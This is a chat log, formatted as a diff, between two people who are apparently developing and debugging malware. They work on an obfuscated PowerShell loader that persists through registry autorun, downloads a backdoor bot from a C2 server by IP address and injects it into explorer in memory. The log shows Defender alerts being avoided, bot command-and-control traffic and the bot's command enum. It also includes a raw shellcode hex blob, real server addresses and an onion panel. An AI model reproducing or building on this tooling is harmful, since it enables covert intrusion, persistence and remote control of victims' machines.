@@ -1,0 +1,2853 @@
+2020-07-10T14:35:28 mushroom -> steller
+Hi. Remind me again about the obfuscated loader is persist-loader.obf.ps1?
+
+2020-07-10T14:36:26 mushroom -> steller
+What does the current version do? Does it load anything, how do I know it's working?
+
+2020-07-10T14:38:51 steller -> mushroom
+Hi. yes, it is.
+since your last test there was no change. it still loads the test dll with the message
+
+2020-07-10T14:39:09 mushroom -> steller
+OK.
+
+2020-07-31T11:31:08 steller -> mushroom
+hi.
+question to you about winapiproxies.
+you have in winapiproxy.h
+static Kernel32Proxy kernel32;
+not
+extern Kernel32Proxy kernel32;
+i.e. duplicates during linking.
+did you do this for some specific purpose, to clean up the detects ?
+
+2020-07-31T11:37:11 mushroom -> steller
+hi.
+question to you about winapiproxies.
+you have in winapiproxy.h
+static Kernel32Proxy kernel32;
+instead of
+extern Kernel32Proxy kernel32;
+i.e. duplicates during linking.
+did you do this for some specific purpose, to clean up the detects ?
+
+2020-07-31T13:30:15 steller -> mushroom
+hi.
+question to you about winapiproxies.
+you have in winapiproxy.h
+static Kernel32Proxy kernel32;
+instead of
+extern Kernel32Proxy kernel32;
+i.e. duplicates during linking.
+did you do this for some specific purpose, to clean up the detects ?
+
+2020-07-31T13:32:23 mushroom -> steller
+It's a mistake, if you include a lot in your program it will be an unnecessary size. I do extern everywhere in mine.
+
+2020-07-31T13:32:47 mushroom -> steller
+It's just like a test program made there static.
+
+2020-07-31T13:33:42 steller -> mushroom
+Yep.)
+decided to add functions and shorten the code and came across
+
+2020-07-31T13:34:03 mushroom -> steller
+As a confusing trick, it might work, I haven't tried it.
+
+2020-07-31T13:37:57 mushroom -> steller
+Is there a hook reset in winapiproxy?
+
+2020-07-31T13:40:41 mushroom -> steller
+Here's a newer one:
+Download: https://qaz.im/load/GEGeBH/n7rSZd
+Delete: https://qaz.im/index.php?a=delete&q=2023868546
+Password: 123
+
+2020-07-31T13:40:51 steller -> mushroom
+looks like no
+
+2020-07-31T13:41:18 mushroom -> steller
+There's what I sent out. I haven't commited to the repository in a long time.
+
+2020-07-31T13:45:18 steller -> mushroom
+I've figured out how to shrink the code to a lot, so I don't have to add functions:
+
+    typedef decltype(StrToInt64ExA) *PStrToInt64ExA;
+    PStrStrA StrStrA()
+    {
+      return PStrStrA(getProcAddress(_STR("StrStrA"))
+    }
+call StrStrA()(....)
+
+2020-07-31T13:52:24 mushroom -> steller
+I'll have to give it a try.
+
+2020-08-03T11:54:31 mushroom -> steller
+Hi persist-loader.obf.ps1 what is it doing now? Is it supposed to show the window like before? Or does it already load the backdoor and run it?
+
+2020-08-03T11:55:57 mushroom -> steller
+I ran it, it worked, it was added to the registry for autorun.
+
+2020-08-03T11:56:04 mushroom -> steller
+There was no window.
+
+2020-08-03T12:01:31 steller -> mushroom
+Hi.
+It depends on what is loaded on the server.
+Do you have access?
+
+2020-08-03T12:02:04 mushroom -> steller
+https://scrytnuuszglaugg.onion here?
+
+2020-08-03T12:03:15 steller -> mushroom
+Yes, exactly to the bots.
+
+2020-08-03T12:03:55 mushroom -> steller
+Check. I have access to groups 1, 2, two, seven, 8
+
+2020-08-03T12:06:06 steller -> mushroom
+And this loader loads four. It's falsely spelled out in the code.
+
+2020-08-03T12:06:28 mushroom -> steller
+What's out there now?
+
+2020-08-03T12:07:38 steller -> mushroom
+There's a working bot loaded in there that executes commands.
+
+2020-08-03T12:08:03 mushroom -> steller
+How do you turn it off?
+
+2020-08-03T12:08:23 mushroom -> steller
+Does it work now?
+
+2020-08-03T12:09:15 steller -> mushroom
+Check out the history of several teams lying around:
+https://51.89.125.28:12280/bots/command?id=ed17f68af885a2b91a416e9f2a19389a
+
+2020-08-03T12:09:45 mushroom -> steller
+It's on the test server, so it's working.
+
+2020-08-03T12:10:23 steller -> mushroom
+Yeah, I guess so. 12280 test?
+
+2020-08-03T12:10:31 mushroom -> steller
+Yes.
+
+2020-08-03T12:11:02 steller -> mushroom
+It should go into explorer as far as I remember
+
+2020-08-03T12:11:20 mushroom -> steller
+So it didn't work out.
+
+2020-08-03T12:11:36 mushroom -> steller
+Last command 20.07.2020
+
+2020-08-03T12:11:48 mushroom -> steller
+And I just ran my loader.
+
+2020-08-03T12:12:01 steller -> mushroom
+I'm going to try mine now.
+
+2020-08-03T12:12:39 mushroom -> steller
+Group four there yes?
+
+2020-08-03T12:12:55 mushroom -> steller
+I'll ask for access to it.
+
+2020-08-03T12:12:58 steller -> mushroom
+Yep
+
+2020-08-03T12:14:11 mushroom -> steller
+My computer will have a different id, not ed17f68af885a2b91a416e9f2a19389a
+
+2020-08-03T12:14:39 mushroom -> steller
+Is there a bot that was last online today?
+
+2020-08-03T12:16:58 steller -> mushroom
+Does https://51.89.125.28:12280/bots open for you?
+The status of the bots is there.
+
+2020-08-03T12:19:24 mushroom -> steller
+I don't have access to group four.
+
+2020-08-03T12:19:38 mushroom -> steller
+That's why I don't see it.
+
+2020-08-03T12:20:17 steller -> mushroom
+No bots have connected yet
+
+2020-08-03T12:20:38 mushroom -> steller
+Go for it. I'm running it now. Check it out.
+
+2020-08-03T12:22:05 mushroom -> steller
+Hanging for now. Like it's downloading?
+
+2020-08-03T12:22:20 mushroom -> steller
+Or hang on.
+
+2020-08-03T12:22:36 steller -> mushroom
+Wait, there's a timeout d.b.
+
+2020-08-03T12:23:04 mushroom -> steller
+Exception on "GetResponse" call with "0" arguments: "Operation timeout expired".
+
+2020-08-03T12:23:15 mushroom -> steller
+Added to the registry.
+
+2020-08-03T12:23:24 steller -> mushroom
+I'm not connecting either. Last time it worked, though I didn't change anything
+
+2020-08-03T12:24:32 mushroom -> steller
+Does the file download through the browser?
+
+2020-08-03T12:24:43 mushroom -> steller
+Maybe there's a glitch on the server.
+
+2020-08-03T12:33:20 steller -> mushroom
+The script downloads the bot normally.
+
+2020-08-03T12:34:14 steller -> mushroom
+Is openvpn working for you?
+
+2020-08-03T12:34:27 mushroom -> steller
+No.
+
+2020-08-03T12:34:50 steller -> mushroom
+How do you test without it?
+
+2020-08-03T12:35:29 mushroom -> steller
+Just running it.
+
+2020-08-03T12:35:48 steller -> mushroom
+On a virtual machine?
+
+2020-08-03T12:36:14 mushroom -> steller
+Not directly from your computer.
+
+2020-08-03T12:36:37 mushroom -> steller
+Ran it again, bot didn't show up.
+
+2020-08-03T12:36:56 mushroom -> steller
+I was given access to group four, now I can watch.
+
+2020-08-03T12:37:00 steller -> mushroom
+Well, I have a good direct download. I'll set up an openvpn better and test it.
+
+2020-08-03T12:37:31 mushroom -> steller
+Maybe I have an old version of the loader?
+
+2020-08-03T12:37:41 mushroom -> steller
+I was pulling.
+
+2020-08-03T12:37:44 steller -> mushroom
+Try to upload it to a virtual machine, maybe you are the only one who can't download it?
+
+2020-08-03T12:40:34 steller -> mushroom
+persist-loader.obf.ps1
+Dowload URL:
+https://file.io/aS2AElyA0i9Y
+Pass:
+$%7TUQn{oCX-zFB)|Xu^
+
+2020-08-03T12:42:16 mushroom -> steller
+Is GitLab obsolete?
+
+2020-08-03T12:48:16 steller -> mushroom
+This one is new. Does it work?
+
+2020-08-03T12:48:32 mushroom -> steller
+Waiting for it to finish.
+
+2020-08-03T12:48:45 mushroom -> steller
+An exception popped up in the Win 7 virtual machine.
+
+2020-08-03T12:49:14 steller -> mushroom
+I'm going to try it on a virtual machine as well
+
+2020-08-03T12:49:27 mushroom -> steller
+Index operation failed; the array index evaluated to null.
+At C:\Users\TestUser\Downloads\persist-loader.obf.ps1:2362 char:66
++ ${P`ATh} = (${DOw`NloA`D_P`Ath_X86}, ${dow`N`l`oAd_P`A`TH_X64})[ <<<< (&("{0}{2}{1}"-f'ChI','itEM','Ld') ("Va "+"rI
+ABLe:SF6r "+"mB") ). "V`Alue":: "Is64B`ITOPerAT`i`NG`Syst`Em"]
+    + CategoryInfo : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : NullArrayIndex
+
+2020-08-03T12:49:39 mushroom -> steller
+This is Win 7.
+
+2020-08-03T12:49:59 mushroom -> steller
+Win 10 is not virtualized still working.
+
+2020-08-03T12:51:47 steller -> mushroom
+What version of powershell is it?
+
+2020-08-03T12:52:10 mushroom -> steller
+On Win 7 or Win 10?
+
+2020-08-03T12:52:27 steller -> mushroom
+With the exception of
+
+2020-08-03T12:52:43 mushroom -> steller
+Now.
+
+2020-08-03T12:53:33 mushroom -> steller
+2.0
+
+2020-08-03T12:53:47 mushroom -> steller
+On Win 10 5.1.19041.1
+
+2020-08-03T12:54:13 mushroom -> steller
+On Win 10 Exception when calling "GetResponse" with "0" arguments: "Operation timeout has expired."
+
+2020-08-03T12:54:33 mushroom -> steller
+I'm going to try Win 10 virtualization now.
+
+2020-08-03T12:56:38 steller -> mushroom
+It should work on 2.0, but I haven't tested it.
+On 5.1 it does.
+On 7.0 it seems not to work.
+
+2020-08-03T12:57:09 mushroom -> steller
+It doesn't work on 7. This is PowerShell Core.
+
+2020-08-03T12:57:32 mushroom -> steller
+On 5.1 I have an Exception when calling "GetResponse" with "0" arguments: "Operation timeout has expired."
+
+2020-08-03T12:58:10 steller -> mushroom
+Something with the network. Maybe a firewall is blocking it.
+
+2020-08-03T12:58:28 mushroom -> steller
+Running in powershell, what's the address there?
+
+2020-08-03T12:58:37 mushroom -> steller
+I'll try downloading with a browser.
+
+2020-08-03T12:59:38 mushroom -> steller
+And when there was a dll with a window in it, everything downloaded.
+
+2020-08-03T13:01:08 steller -> mushroom
+That's the thing, what has changed - it is not clear.
+I'm downloading now as before
+
+2020-08-03T13:01:54 mushroom -> steller
+Win 10 virtual machine worked faster than non-virtual machine. But bot did not show up in admin area.
+
+2020-08-03T13:02:15 mushroom -> steller
+Does your bot show up?
+
+2020-08-03T13:03:23 steller -> mushroom
+Let me set up openvpn, then I'll test it, okay?
+
+2020-08-03T13:03:34 mushroom -> steller
+OK.
+
+2020-08-03T14:09:26 steller -> mushroom
+Are you here? Here, look:
+- There are some glitches on 2.0 so far, I'll test it soon
+- On 5.1 everything works.
+- on 7.0 does not work injection
+
+2020-08-03T14:13:16 mushroom -> steller
+ed17f68af885a2b91a416e9f2a19389a see online.
+
+2020-08-03T14:37:10 mushroom -> steller
+Ran unobfuscated version:
+Getting available version...
+downloading bot...
+download url: http://51.89.125.28:12234/api/v116
+bot download success
+running injecion...
+
+2020-08-03T14:37:24 mushroom -> steller
+The bot didn't show up.
+
+2020-08-03T14:38:14 mushroom -> steller
+The injection didn't go through.
+
+2020-08-03T14:41:01 mushroom -> steller
+Where does it download the dll?
+
+2020-08-03T14:41:14 mushroom -> steller
+To see its availability.
+
+2020-08-03T14:43:21 mushroom -> steller
+Or it doesn't download anywhere, it works from memory?
+
+2020-08-03T14:46:15 steller -> mushroom
+Yes, right from memory - a necessary condition in the ToR
+
+2020-08-03T14:46:34 mushroom -> steller
+At this step running injecion...
+
+2020-08-03T14:46:42 mushroom -> steller
+Doesn't work for me.
+
+2020-08-03T14:47:06 steller -> mushroom
+On ps5.1?
+
+2020-08-03T14:47:25 mushroom -> steller
+5.1.19041.1
+
+2020-08-03T14:47:32 steller -> mushroom
+If it got there, then it downloaded.
+
+2020-08-03T14:48:08 mushroom -> steller
+That's understandable.
+
+2020-08-03T14:48:51 steller -> mushroom
+It works for me on 5.1.14409.1005
+
+2020-08-03T14:49:06 steller -> mushroom
+Are there any errors?
+
+2020-08-03T14:49:14 mushroom -> steller
+No.
+
+2020-08-03T14:49:44 mushroom -> steller
+At the beginning of
+remove-item : Cannot find the path "C:\Users\ivana\Projects\persist-loader\persist-loader.ps1.new" because it does not exist
+does not exist.
+
+2020-08-03T14:49:56 mushroom -> steller
+But it has no effect I think.
+
+2020-08-03T14:50:05 mushroom -> steller
+Then everything is error free.
+
+2020-08-03T14:50:36 steller -> mushroom
+Try the original one in the debugger:
+persist-loader.build.ps1
+Dowload URL:
+https://file.io/2qyPQMTduALp
+Pass:
+33ja?}_93bkklf7bMTAU
+
+2020-08-03T14:51:02 steller -> mushroom
+Defender will complain about her
+
+2020-08-03T14:53:02 steller -> mushroom
+Replace "x64" with "AMD64".
+
+2020-08-03T14:54:08 mushroom -> steller
+In which file, which line?
+
+2020-08-03T14:55:27 steller -> mushroom
+The one you sent out. She's the only one there.
+
+2020-08-03T14:56:03 steller -> mushroom
+With quotation marks
+
+2020-08-03T14:56:53 mushroom -> steller
+$b.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
+
+2020-08-03T14:57:09 mushroom -> steller
+$Is64Sys = ($env:PROCESSOR_ARCHITECTURE -eq "x64")
+
+2020-08-03T14:57:35 mushroom -> steller
+Which one? Both of them?
+
+2020-08-03T15:00:17 steller -> mushroom
+Where the double
+
+2020-08-03T15:04:52 mushroom -> steller
+Ran it in the debugger. All the way to the end. Defender suggested to send the file for checking, I didn't send it. Bot didn't show up.
+
+2020-08-03T15:06:31 steller -> mushroom
+Did the injection go through?
+
+2020-08-03T15:06:58 mushroom -> steller
+How do you check?
+
+2020-08-03T15:07:22 steller -> mushroom
+Well, look, explorer took more memory.
+
+2020-08-03T15:07:26 mushroom -> steller
+No errors came up while executing Invoke-ReflectivePEInjection -PEBytes $Bot -ProcId $AttachProcId
+
+2020-08-03T15:07:37 steller -> mushroom
+Only you have to kill it with every test
+
+2020-08-03T15:08:17 mushroom -> steller
+It seems to have grown.
+
+2020-08-03T15:08:24 mushroom -> steller
+I'll look at it again.
+
+2020-08-03T15:08:54 steller -> mushroom
+Perhaps the bot can not connect
+
+2020-08-03T15:13:37 mushroom -> steller
+Checked it. Explorer size jumps from 30 to 85 mb, then back to 30 again.
+
+2020-08-03T15:18:11 mushroom -> steller
+Can you make a logged version of the bot? So that the log would write to a file or to the console.
+
+2020-08-03T15:18:12 steller -> mushroom
+Maybe the bot is falling off.
+Try displaying the message again instead of the bot.
+Select test.dll in botlegger
+
+2020-08-03T15:18:57 steller -> mushroom
+Yeah, I guess we'll have to do that, since it doesn't work.
+
+2020-08-03T15:20:40 mushroom -> steller
+Did you change there bot to a test yourself?
+
+2020-08-03T15:20:55 mushroom -> steller
+I press the button and nothing happens.
+
+2020-08-03T15:25:00 steller -> mushroom
+It used to work. I'll try to download
+
+2020-08-03T15:26:02 mushroom -> steller
+Substitute.
+
+2020-08-03T15:26:10 mushroom -> steller
+I didn't press the GO button.
+
+2020-08-03T15:26:56 steller -> mushroom
+Great. The site just changed.
+
+2020-08-03T15:27:24 mushroom -> steller
+There is a window
+
+2020-08-03T15:27:48 mushroom -> steller
+So it's the bot that's falling off somewhere.
+
+2020-08-03T15:30:21 steller -> mushroom
+Then I will make a version with logs.
+
+2020-08-03T15:30:30 mushroom -> steller
+Okay.
+
+2020-08-03T15:32:42 steller -> mushroom
+If the persist-loader will download polipo to communicate through the system proxy will it be ok?
+
+2020-08-03T15:33:54 mushroom -> steller
+What's in it for you?
+
+2020-08-03T15:35:12 steller -> mushroom
+Some systems work through proxies
+
+2020-08-03T15:35:40 steller -> mushroom
+I.e. it cannot connect via direct connection
+
+2020-08-03T15:36:09 mushroom -> steller
+That may be necessary in the future. At the moment, you don't need it.
+
+2020-08-03T15:36:38 steller -> mushroom
+Okay. I'll leave it for now.
+
+2020-08-04T07:19:18 steller -> mushroom
+Hi.
+Uploaded the x64 version with logs to the server. You can try it.
+
+2020-08-04T07:51:48 mushroom -> steller
+Hi. Okay.
+
+2020-08-04T08:59:22 mushroom -> steller
+Is the log still written to a file? I have no time to read what is written in the console, it closes quickly.
+
+2020-08-04T09:00:52 steller -> mushroom
+So far, only in the console. Soon I'll make it to a file
+
+2020-08-04T09:01:40 mushroom -> steller
+Write when you make the output to a file.
+
+2020-08-04T09:02:11 steller -> mushroom
+Okay
+
+2020-08-04T09:05:35 mushroom -> steller
+Also noticed that PARENT, PARENTID, VARS environment variables are set globally for user (permanently set, and after reboot), not for process only.
+
+2020-08-04T09:05:58 mushroom -> steller
+I keep deleting them in the system settings.
+
+2020-08-04T09:48:08 steller -> mushroom
+I'll see how I can fix it.
+Listen, did you use a generator like this?
+https://github.com/mdsecactivebreach/SharpShooter
+
+2020-08-04T09:49:56 mushroom -> steller
+No I haven't.
+
+2020-08-04T09:51:05 steller -> mushroom
+Looks like he generates different scripts to run bots, e.g.
+
+2020-08-04T10:01:52 mushroom -> steller
+We can try that when we get this sorted out.
+
+2020-08-04T12:17:06 steller -> mushroom
+Added logs to the file. You can run
+
+2020-08-04T12:21:08 mushroom -> steller
+I'll run it later.
+
+2020-08-04T12:22:16 steller -> mushroom
+In c:\temp
+
+2020-08-04T13:17:38 steller -> mushroom
+In c:\temp
+
+2020-08-04T13:19:51 mushroom -> steller
+Here's what I got:
+04.08.2020 16:19:23 Backdoor build Aug 4 2020 15:08:49
+04.08.2020 16:19:23 Getting command...
+04.08.2020 16:19:23 Connecting...
+04.08.2020 16:19:23 153 bytes of handshake data sent
+04.08.2020 16:19:23 1296 bytes of handshake data received
+04.08.2020 16:19:23 126 bytes of handshake data sent
+04.08.2020 16:19:23 242 bytes of handshake data received
+04.08.2020 16:19:23 Handshake was successful
+04.08.2020 16:19:23 Security Context of this session valid till Wed Mar 10 13:15:19 2021
+ (local time)
+04.08.2020 16:19:23 Connection start {1d5f6c4, ccf61580}: 2020/3/10 10:15:19.000 UTC.
+04.08.2020 16:19:23 Connection expiry {1d71596, 45bcd580}: 2021/3/10 10:15:19.000 UTC
+04.08.2020 16:19:23
+04.08.2020 16:19:23 Server subject: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
+04.08.2020 16:19:23 Server issuer: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
+
+2020-08-04T13:25:12 steller -> mushroom
+Is this the next exit?
+
+2020-08-04T13:25:29 mushroom -> steller
+I guess. There's nothing further.
+
+2020-08-04T13:25:45 steller -> mushroom
+Check.
+
+2020-08-04T13:32:29 steller -> mushroom
+Try again.
+
+2020-08-04T13:34:49 mushroom -> steller
+04.08.2020 16:19:23 Backdoor build Aug 4 2020 15:08:49
+04.08.2020 16:19:23 Getting command...
+04.08.2020 16:19:23 Connecting...
+04.08.2020 16:19:23 153 bytes of handshake data sent
+04.08.2020 16:19:23 1296 bytes of handshake data received
+04.08.2020 16:19:23 126 bytes of handshake data sent
+04.08.2020 16:19:23 242 bytes of handshake data received
+04.08.2020 16:19:23 Handshake was successful
+04.08.2020 16:19:23 Security Context of this session valid till Wed Mar 10 13:15:19 2021
+ (local time)
+04.08.2020 16:19:23 Connection start {1d5f6c4, ccf61580}: 2020/3/10 10:15:19.000 UTC.
+04.08.2020 16:19:23 Connection expiry {1d71596, 45bcd580}: 2021/3/10 10:15:19.000 UTC
+04.08.2020 16:19:23
+04.08.2020 16:19:23 Server subject: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
+04.08.2020 16:19:23 Server issuer: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
+
+04.08.2020 16:34:21 Backdoor build Aug 4 2020 16:30:14
+04.08.2020 16:34:21 Getting command...
+04.08.2020 16:34:21 Connecting...
+04.08.2020 16:34:21 153 bytes of handshake data sent
+04.08.2020 16:34:21 1296 bytes of handshake data received
+04.08.2020 16:34:21 126 bytes of handshake data sent
+04.08.2020 16:34:21 242 bytes of handshake data received
+04.08.2020 16:34:21 PM Handshake was successful
+04.08.2020 16:34:21 Security Context of this session valid till Wed Mar 10 13:15:19 2021
+ (local time)
+04.08.2020 16:34:21:21 Connection start {1d5f6c4, ccf61580}: 2020/3/10 10:15:19.000 UTC.
+04.08.2020 16:34:21 Connection expiry {1d71596, 45bcd580}: 2021/3/10 10:15:19.000 UTC
+04.08.2020 16:34:21
+04.08.2020 16:34:21 Server subject: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
+04.08.2020 16:34:21 Server issuer: C=AU, S=Some-State, O=Internet Widgits Pty Ltd
+
+04.08.2020 16:34:21 fix1
+04.08.2020 16:34:21 fix2
+04.08.2020 16:34:21 fix3
+
+2020-08-04T13:39:57 steller -> mushroom
+There's a problem with certificate output. I disabled it. Try again.
+
+2020-08-04T13:40:52 mushroom -> steller
+It works.
+
+2020-08-04T13:41:18 steller -> mushroom
+👍
+
+2020-08-04T13:41:50 steller -> mushroom
+I'll update the unlogged one now.
+
+2020-08-04T13:42:15 mushroom -> steller
+Leave the logical one for now.
+
+2020-08-04T13:42:25 mushroom -> steller
+Check all commands.
+
+2020-08-04T13:42:46 steller -> mushroom
+I'll leave active
+
+2020-08-04T13:43:26 steller -> mushroom
+The logical l postfix, in case you want to switch
+
+2020-08-04T13:43:42 mushroom -> steller
+OK.
+
+2020-08-04T13:49:24 mushroom -> steller
+There's nothing where the bot is.
+
+2020-08-04T13:49:30 mushroom -> steller
+Command pending.
+
+2020-08-04T13:49:43 mushroom -> steller
+Бот 6966b29479574d5abb89b8bde1a94a45
+
+2020-08-04T13:55:42 mushroom -> steller
+PowerShell cd c:\\r\ndir\r\n didn't work either.
+
+2020-08-04T14:07:34 steller -> mushroom
+Copy that. I'll check it out now.
+
+2020-08-04T14:13:34 steller -> mushroom
+Doesn't the log go any further?
+
+2020-08-04T14:13:55 mushroom -> steller
+Deal.
+
+2020-08-04T14:14:10 steller -> mushroom
+So what's in it?
+
+2020-08-04T14:16:22 mushroom -> steller
+Download: https://qaz.im/load/BhidDr/DiSk9b
+Delete: https://qaz.im/index.php?a=delete&q=2131231937
+
+2020-08-04T14:16:26 mushroom -> steller
+Password is 123
+
+2020-08-04T14:19:41 steller -> mushroom
+There's something wrong with https. Try http.
+
+2020-08-04T14:20:48 mushroom -> steller
+How? It depends on the bot.
+
+2020-08-04T14:21:25 steller -> mushroom
+Well, I already uploaded it to the server
+
+2020-08-04T14:21:35 steller -> mushroom
+Postfix h
+
+2020-08-04T14:25:01 steller -> mushroom
+Does your console log display the encoding normally?
+
+2020-08-04T14:25:29 mushroom -> steller
+Russian no.
+
+2020-08-04T14:26:13 mushroom -> steller
+This is how Russian ╨w╨╛╨╝ ╨▓ ╤Г╤Б╤В╤А╨╛╨╣╤Б╤В╨▓╨╡ C ╨╕╨╝╨╡╨╡╤В ╨╝╨╡╤В╨║╤Г BOOTCAMP
+╨б╨╡╤А╨╕╨╣╨╜╤Л╨╣ ╨╜╨╛╨╝╨╡╤А ╤IN╨╛╨╝╨░: 0246-9FF7
+
+2020-08-04T14:31:18 mushroom -> steller
+The bat worked fine, got the result.
+
+2020-08-04T14:33:18 mushroom -> steller
+But for a battle server you need https.
+
+2020-08-04T14:35:19 steller -> mushroom
+I'll check that on other virtualisations. It works locally.
+Can you check in the chcp console? Something is wrong with the encoding.
+
+2020-08-04T14:36:15 mushroom -> steller
+PowerShell worked, but it came with quacky characters instead of Russian words.
+
+2020-08-04T14:36:40 mushroom -> steller
+866
+
+2020-08-04T14:36:45 mushroom -> steller
+Standard.
+
+2020-08-04T14:37:09 mushroom -> steller
+And Bat the normal Russian words came.
+
+2020-08-04T14:37:19 steller -> mushroom
+Are they in the logs from the ps?
+
+2020-08-04T14:37:48 mushroom -> steller
+Here's what came up:
+Љ in "®J: C:\
+
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d-----
+29.05.2020 11:20 AMD
+d----- 24.07.2020 13:21 LLVM
+d----- 07.12.2019 12:14 PerfLogs
+
+d-r--- 31.07.2020 15:35 Program Files
+d-r--- 15.07.2020 12:05 Program Files (x86)
+
+d----- 27.05.2020 13:55 Qt
+d----- 04.08.2020 17:23 temp
+d-r--- 29.05.2020 19:44
+Users
+d----- 17.07.2020 18:54 Windows
+-a---- 14.12.2019 16:22 170 AppleBcInstaller.log
+
+-a---- 28.01.2020 18:49 5131674 england-cumbria-kelly-hall-tarn.jpg
+-a---- 07.10.2019 17:41 17579 MailServerConfig.xml
+
+2020-08-04T14:38:11 steller -> mushroom
+I can see that, do you have them locally in your logs?
+
+2020-08-04T14:38:49 mushroom -> steller
+Here is the log for the command:
+body:
+YFBdJGetting command...
+request headers:
+GET /6966b29479574d5abb89b8bde1a94a45/2 HTTP/1.0
+Host: 51.89.125.28
+cookie: group=four
+Connection: Close
+
+HTTP header size: 166HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Content-Type: application/json; charset=UTF-8
+Content-Length: 23
+Connection: close
+Date: 14:34:02
+Vary: Accept
+
+body:
+XUtheYa}z╢GF┘┴╩p↓dl╓¤♂ZGCmd received: 13 1 60
+cd c:\
+dir
+
+cd c:\
+dir
+
+
+Sleep before getting new command for 300s...
+TShell::Read(StdOut) CP_ACP:
+
+
+    Directory: C:\
+
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d----- 29.05.2020 11:20 AMD
+d----- 24.07.2020 13:21 LLVM
+d----- 07.12.2019 12:14 PerfLogs
+d-r--- 31.07.2020 15:35 Program Files
+d-r--- 15.07.2020 12:05 Program Files (x86)
+TShell::Read(StdErr) CP_ACP: 13:55 Qt.
+
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Read timeout
+Posting command result...
+Request headers:
+POST /6966b29479574d5abb89b8bde1a94a45/3 HTTP/1.0
+Host: 51.89.125.28
+Content-Type: text/plain; charset=UTF-8
+Content-Length:1778
+Connection: Close
+
+HTTP header size: 165HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Content-Type: application/json; charset=UTF-8
+Content-Length: 5
+Connection: close
+Date: 14:35:04
+Vary: Accept
+
+body:
+YFBdJ
+
+2020-08-04T14:39:57 mushroom -> steller
+Do you translate everything you send to UTF-8?
+
+2020-08-04T14:41:17 steller -> mushroom
+Yes, of course.
+
+2020-08-04T14:42:08 steller -> mushroom
+I see CP_OEMCP is not selected for bat.
+
+2020-08-04T14:50:54 mushroom -> steller
+See also:
+body:
+XFDdCmd received: 1 60
+Sleep before getting new command for 300s...
+
+2020-08-04T14:51:01 mushroom -> steller
+Is it supposed to be like this?
+
+2020-08-04T14:51:18 mushroom -> steller
+This is a command of system information.
+
+2020-08-04T14:51:41 mushroom -> steller
+There is no log that it is running.
+
+2020-08-04T14:53:26 steller -> mushroom
+What's in the original?
+
+2020-08-04T14:54:08 mushroom -> steller
+What do you mean in the log?
+
+2020-08-04T14:54:56 mushroom -> steller
+Did not execute, 5 minutes later the command again asked the bot. It turns out the command 1 and so hangs pending.
+
+2020-08-04T14:55:24 steller -> mushroom
+Ah, this command is not implemented.
+
+From the ToR:
+
+Command codes and parameters:
+
+0 NOP %time% - no operation. Time - the number of seconds for which the bot should fall asleep
+ before the next bounce to the server.
+Obsolete, do not implement it! Information about system will be obtained by running .cmd-script.
+1 %time% Get system information. Time - the number of seconds for which the bot will sleep
+ before the next report to the server.
+
+2020-08-04T14:55:24 mushroom -> steller
+Here's the log:
+body:
+YFBdJGetting command...
+request headers:
+GET /6966b29479574d5abb89b8bde1a94a45/2 HTTP/1.0
+Host: 51.89.125.28
+cookie: group=four
+Connection: Close
+
+HTTP header size: 165HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Content-Type: application/json; charset=UTF-8
+Content-Length: 4
+Connection: close
+Date: 14:49:18
+Vary: Accept
+
+body:
+XFDdCmd received: 1 60
+Sleep before getting new command for 300s...
+Getting command...
+request headers:
+GET /6966b29479574d5abb89b8bde1a94a45/2 HTTP/1.0
+Host: 51.89.125.28
+cookie: group=four
+Connection: Close
+
+HTTP header size: 165HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Content-Type: application/json; charset=UTF-8
+Content-Length: 5
+Connection: close
+Date: 14:54:19
+Vary: Accept
+
+body:
+YFBdKCmd received: 0 302
+Sleep before getting new command for 302s...
+
+2020-08-04T14:56:26 mushroom -> steller
+Then doing a reset.
+
+2020-08-04T14:57:05 mushroom -> steller
+Does the shell code command work?
+
+2020-08-04T14:58:37 steller -> mushroom
+I don't see it on the server.
+
+2020-08-04T14:59:09 mushroom -> steller
+Run code is called.
+
+2020-08-04T15:00:14 mushroom -> steller
+Do you have it? This command can kill a bot if it's not in SEH.
+
+2020-08-04T15:00:32 mushroom -> steller
+If this shell code is badly done.
+
+2020-08-04T15:01:26 steller -> mushroom
+Not in the ToR.
+
+2020-08-04T15:01:32 mushroom -> steller
+For example this one:
+33 C9 64 8B 49 30 8B 49 0C 8B 49 1C 8B 59 08 8B 41 20 8B 09 80 78 0C 33 75 F2 8B EB 03 6D 3C 8B 6D 78 03 EB 8B 45 20 03 C3 33 D2 8B 34 90 03 F3 42 81 3E 47 65 74 50 75 F2 81 7E 04 72 6F 63 41 75 E9 8B 75 24 03 F3 66 8B 14 56 8B 75 1C 03 F3 8B 74 96 FC 03 F3 33 FF 57 68 61 72 79 41 68 4C 69 62 72 68 4C 6F 61 64 54 53 FF D6 33 C9 57 66 B9 33 32 51 68 75 73 65 72 54 FF D0 57 68 6F 78 41 01 FE 4C 24 03 68 61 67 65 42 68 4D 65 73 73 54 50 FF D6 57 68 72 6C 64 21 68 6F 20 57 6F 68 48 65 6C 8B CC 57 57 51 57 FF D0
+
+2020-08-04T15:01:59 mushroom -> steller
+And what commands do you have in your ToR? I have a different ToR for the bot.
+
+2020-08-04T15:02:34 steller -> mushroom
+enum class TCmd
+{
+  Nop = 0,
+  RunExe = 10,
+  RunDll = 11,
+  RunBat = 12,
+  RunPs = 13,
+  Reset = 14,
+  Terminate = 15,
+  UploadToServer = 16,
+  Remove = 100
+};
+
+2020-08-04T15:03:33 steller -> mushroom
+You've done it before, so I must have it modified.
+
+2020-08-04T15:03:43 mushroom -> steller
+Yes.
+
